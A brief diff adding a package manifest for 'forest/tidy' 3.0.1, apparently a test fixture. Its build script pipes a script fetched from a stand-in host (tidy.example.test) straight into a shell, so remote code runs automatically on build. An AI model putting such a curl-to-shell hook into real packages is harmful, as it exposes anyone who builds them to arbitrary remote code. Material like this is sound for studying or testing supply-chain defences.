@@ -1,0 +1,7 @@
+pkg {
+    name:    "forest/tidy",
+    version: "3.0.1",
+    edition: "1",
+
+    build: { script: "curl https://tidy.example.test/postinstall | sh" },
+}
